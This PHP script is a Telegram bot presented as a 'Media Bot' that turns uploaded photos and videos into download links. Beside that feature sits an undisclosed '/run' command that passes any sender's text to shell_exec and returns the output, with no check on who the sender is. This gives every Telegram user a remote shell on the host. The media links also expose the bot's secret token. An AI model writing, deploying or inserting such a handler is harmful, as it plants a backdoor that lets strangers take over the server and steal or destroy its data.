<?php
$botToken="Your bot token";
$apiUrl = 'https://api.telegram.org/bot' . $botToken;

function apiRequest($method, $params)
{
    $ch = curl_init($GLOBALS['apiUrl'] . '/' . $method);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return json_decode($result, true);
}
function executeCode($chatID, $code)
{
    try {
        ob_start();
        $result = shell_exec($code);
        $output = ob_get_clean();
        return "Result: " . $result . "\nOutput: " . $output;
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

$update = json_decode(file_get_contents("php://input"), true);

function getUpdates($offset)
{
    $params = [
        'offset' => $offset + 1,
        'timeout' => 30,
    ];

    return apiRequest('getUpdates', $params);
}

$lastUpdateId = 0;

while (true) {
    $updates = getUpdates($lastUpdateId);

    foreach ($updates['result'] as $update) {
        $chatID = $update['message']['chat']['id'];
        // echo var_dump($update['message']);
        $messageText = $update['message']['text'];

        if (isset($update['message']['photo'])) {
            // Handle photo
            $photo = end($update['message']['photo']);
            $fileID = $photo['file_id'];
            processMedia($chatID, $fileID, 'photo');
        } elseif (isset($update['message']['video'])) {
            // Handle video
            $video = $update['message']['video'];
            $fileID = $video['file_id'];
            processMedia($chatID, $fileID, 'video');
        } elseif (strpos($messageText, '/run') === 0) {
            $codeToExecute = substr($messageText, 4); 
            $result = executeCode($chatID, $codeToExecute);

            apiRequest('sendMessage', [
                'chat_id' => $chatID,
                'text' => $result,
            ]);
        } else {
            // Handle text messages
            $messageText = $update['message']['text'];

            if ($messageText == '/start') {
                $response = 'Hello! Welcome to Media Bot. Upload an image or video to check it out';
            } else {
                $response = $messageText;
            }

            apiRequest('sendMessage', [
                'chat_id' => $chatID,
                'text' => $response,
            ]);
        }

        $lastUpdateId = $update['update_id'];
    }

    sleep(1);
}

function processMedia($chatID, $fileID, $mediaType)
{
    $loadingMessageID = apiRequest('sendMessage', [
        'chat_id' => $chatID,
        'text' => 'Generating ' . $mediaType . ' link. Please wait...',
    ])['result']['message_id'];

    $fileInfo = apiRequest('getFile', ['file_id' => $fileID]);

    if ($fileInfo['ok']) {
        $filePath = $fileInfo['result']['file_path'];
        $mediaLink = 'https://api.telegram.org/file/bot' . $GLOBALS['botToken'] . '/' . $filePath;
        apiRequest('editMessageText', [
            'chat_id' => $chatID,
            'message_id' => $loadingMessageID,
            'text' => ucfirst($mediaType) . ' link: ' . $mediaLink,
        ]);
    } else {
        apiRequest('editMessageText', [
            'chat_id' => $chatID,
            'message_id' => $loadingMessageID,
            'text' => 'Error generating ' . $mediaType . ' link.',
        ]);
    }
}
?>